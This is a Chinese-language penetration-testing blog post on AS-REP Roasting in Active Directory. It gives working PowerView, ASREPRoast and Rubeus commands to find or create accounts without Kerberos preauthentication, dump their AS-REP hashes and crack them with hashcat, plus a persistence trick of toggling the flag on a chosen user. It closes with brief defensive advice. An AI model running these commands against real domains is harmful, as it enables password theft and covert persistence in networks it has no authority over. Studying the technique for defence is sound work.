---
layout: post
title: 域渗透——AS-REPRoasting
---


## 0x00 前言
---

AS-REP Roasting同Kerberoasting类似，如果满足条件，就能够获得用户口令的hash，再结合hashcat进行破解，最后能够还原出用户的明文口令。

本文将要参考公开资料，结合自己的理解，介绍AS-REP Roasting的利用方法，最后给出防御建议。

## 0x01 简介
---

本文将要介绍以下内容：

- AS-REP Roasting的原理
- AS-REP Roasting的利用条件
- AS-REP Roasting的利用方法
- 破解hash的方法
- 防御建议

## 0x02 AS-REP Roasting
---

### 1.简介

对于域用户，如果设置了选项"Do not require Kerberos preauthentication"，此时向域控制器的88端口发送AS-REQ请求，对收到的AS-REP内容重新组合，能够拼接成"Kerberos 5 AS-REP etype 23"(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令

### 2.利用前提

域用户设置了选项"Do not require Kerberos preauthentication"

通常情况下，该选项默认不会开启

### 3.利用思路

通常在域渗透中用来维持权限

需要先获得对指定用户的GenericWrite权限，利用思路如下：

1. 开启用户选项"Do not require Kerberos preauthentication"
2. 导出hash并破解
3. 关闭用户选项"Do not require Kerberos preauthentication"

## 0x03 AS-REP Roasting的利用方法
---

### 1.寻找满足条件的用户

用户需要开启选项"Do not require Kerberos preauthentication"

这里可以使用LDAP查询满足条件(userAccountControl:1.2.840.113556.1.4.803:=4194304)的用户

参考资料：

https://support.microsoft.com/en-us/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties

https://github.com/PowerShellMafia/PowerSploit/blob/445f7b2510c4553dcd9451bc4daccb20c8e67cbb/Recon/PowerView.ps1#L4769

DONT_REQ_PREAUTH项对应的值为4194304

PowerView的命令如下：

```
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Verbose
```

示例如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/2-1.png)

只显示distinguishedname项：

```
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
```

示例如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/2-2.png)

### 2.开启和关闭选项"Do not require Kerberos preauthentication"

开启选项意味着对用户添加属性(userAccountControl=4194304)

开启选项的命令如下：

```
Import-Module .\PowerView.ps1
Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
```

关闭选项意味着删除用户属性(userAccountControl=4194304)

**注：**

这里可以再次进行异或运算，两次异或相当于不改变原数值，即删除用户属性(userAccountControl)

关闭选项的命令如下：

```
Import-Module .\PowerView.ps1
Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
```

### 3.导出hash

#### (1)使用Powershell

https://github.com/HarmJ0y/ASREPRoast

导出所有可用用户hash的命令如下：

```
Import-Module .\ASREPRoast.ps1
Invoke-ASREPRoast -Verbose |fl
```

示例如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/3-1.png)

导出指定用户hash的命令如下：

```
Get-ASREPHash -UserName testb -Verbose
```

示例如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/3-2.png)

提取出hash：

```
$krb5asrep$testb@test.com:a128092441a3af80015554db2f3fe44e$d69b44c7d9cf36261a012d012f636a2124837af89a48ef686e1ac7572af93741fc801423443a85c9aacd6a5f85f1d840d07b09e68795ce691a818fa765674c3f25492ed49e7274d98096d599c9ff0de6e169efdb3429cde39dbdea4633580981bcb34ecf330d0cb2cb194e2944f77b8fc15c056684fee33d3ee7e0b86bc56072c3bfcd2d3abeb06bfb42144a06cf90c5c60e9c255d93d9c62bbf1cc37e75d8f6d22120bf8de673db20f108da96a9e3d9d099346fff8619f49961feeaf96c35eb1a237b42b6716012dfc08d96146eb1df65e9a66a67685c04f8ab7e21bfa36800babc1ad3
```

#### (2)使用C#(Rubeus)

https://github.com/GhostPack/Rubeus

命令如下:

```
Rubeus.exe asreproast
```

示例如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-7-18/3-3.png)

### 4.使用hashcat进行破解

提取出hash：

```
$krb5asrep$testb@test.com:a128092441a3af80015554db2f3fe44e$d69b44c7d9cf36261a012d012f636a2124837af89a48ef686e1ac7572af93741fc801423443a85c9aacd6a5f85f1d840d07b09e68795ce691a818fa765674c3f25492ed49e7274d98096d599c9ff0de6e169efdb3429cde39dbdea4633580981bcb34ecf330d0cb2cb194e2944f77b8fc15c056684fee33d3ee7e0b86bc56072c3bfcd2d3abeb06bfb42144a06cf90c5c60e9c255d93d9c62bbf1cc37e75d8f6d22120bf8de673db20f108da96a9e3d9d099346fff8619f49961feeaf96c35eb1a237b42b6716012dfc08d96146eb1df65e9a66a67685c04f8ab7e21bfa36800babc1ad3
```

拼接成hashcat能够识别的格式需要在`$krb5asrep`后面添加`$23`

hashcat使用字典破解的参数如下：

```
hashcat -m 18200 '$krb5asrep$23$testb@test.com:a128092441a3af80015554db2f3fe44e$d69b44c7d9cf36261a012d012f636a2124837af89a48ef686e1ac7572af93741fc801423443a85c9aacd6a5f85f1d840d07b09e68795ce691a818fa765674c3f25492ed49e7274d98096d599c9ff0de6e169efdb3429cde39dbdea4633580981bcb34ecf330d0cb2cb194e2944f77b8fc15c056684fee33d3ee7e0b86bc56072c3bfcd2d3abeb06bfb42144a06cf90c5c60e9c255d93d9c62bbf1cc37e75d8f6d22120bf8de673db20f108da96a9e3d9d099346fff8619f49961feeaf96c35eb1a237b42b6716012dfc08d96146eb1df65e9a66a67685c04f8ab7e21bfa36800babc1ad3' /usr/share/john/password.lst -o found.txt --force
```

参数说明：

`/usr/share/john/password.lst`为字典文件的位置
`-o found.txt`表示输出结果的位置

## 0x04 防御建议
---

1.确保域内不存在开启"Do not require Kerberos preauthentication"的用户

扫描方法(使用PowerView)：

```
Import-Module .\PowerView.ps1
Get-DomainUser -PreauthNotRequired -Verbose
```

2.域用户强制使用复杂口令，提高被字典和暴力破解的难度

## 0x05 小结
---

本文介绍了AS-REP Roasting在域渗透中的利用条件和方法，给出防御建议


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)




